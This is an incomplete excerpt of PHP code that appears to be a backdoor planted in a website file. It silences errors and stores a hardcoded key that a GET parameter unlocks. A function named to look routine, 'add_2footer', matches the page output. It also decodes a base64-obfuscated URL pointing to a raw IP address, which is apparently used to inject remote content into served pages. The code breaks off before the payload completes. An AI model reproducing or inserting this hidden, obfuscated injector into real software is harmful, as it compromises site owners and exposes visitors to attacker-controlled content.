...
error_reporting(0);
$_passssword = 'f677f74ad3b36a9ec2238ac6ce8335d6';
unset($_passssword);
...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == 'f677f74ad3b36a9ec2238ac6ce8335d6') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
        $url = base64_decode('aHR0cDovLzEwOS4yNDguMjUwLjEwOC9ibG9nLz90dXJidWxlbmNlJnV0bV9zb3VyY2U9MTY3MTk6NjcxOTgwOjgxNA==');
